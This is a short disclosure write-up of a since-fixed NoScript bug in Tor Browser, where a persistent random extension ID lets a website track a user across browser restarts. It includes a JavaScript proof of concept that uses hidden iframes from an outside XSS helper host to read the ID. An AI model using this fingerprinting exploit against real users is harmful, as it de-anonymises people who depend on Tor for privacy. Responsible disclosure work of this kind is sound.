title: Identify Tor user across browser restarts (Fixed)
---

"Tor Browser aims to make all users look the same, making it difficult for you to be fingerprinted based on your browser and device information."

NoScript is installed by default and cant be removed.
Other browser extensions are discouraged since there normally fingerprintable <https://gitlab.torproject.org/tpo/applications/tor-browser/-/issues/41581#note_2949932>

On the first install of the Tor browser, NoScript gets assigned a random extension ID that never changes. Because of this Firefox bug: <https://bugzilla.mozilla.org/show_bug.cgi?id=1372288>

This is different to the chromium way of using a universal extension ID for manifest v2 which while did allow detecting if an extension was installed there was no random extension/user ID generated.
Manifest v3 does have a `use_dynamic_url` feature that claims to be "per session and regenerated on browser restart or extension reload"

If the user increases there browser security level to "Safer" or in the NoScript settings page disables the media toggle this ID would be shared to an attacker controlled website using the following PoC:

```js
// Just a blank video
f = document.createElement('iframe');
f.hidden = true;
f.src = 'https://terjanq.me/xss.php?ct=video/mp4';
document.body.appendChild(f);

payload = `
let x = setInterval(() => {
 try {
  parent[0].document.links[0].style.opacity = 1;
  let link = parent[0].document.head.getElementsByTagName('link')[0];
  if (link && link.href) {
   let origin = new URL(link.href).hostname;
   alert('User ID: ' + origin);
   clearInterval(x);
  }
 } catch {}
}, 10);
`;

setTimeout(() => {
  f2 = document.createElement('iframe');
  f2.hidden = true;
  // runs code same-origin as video
  f2.src = 'https://terjanq.me/xss.php?js=' + encodeURIComponent(payload);
  document.body.appendChild(f2);
}, 100);
```

It was fixed in version 11.4.28 by calling `tabs.insertCSS` instead of referencing the css file with `runtime.getURL`

# Was it awarded?

No because it was reported directly but may have been under "Low ($100 - $1000)"
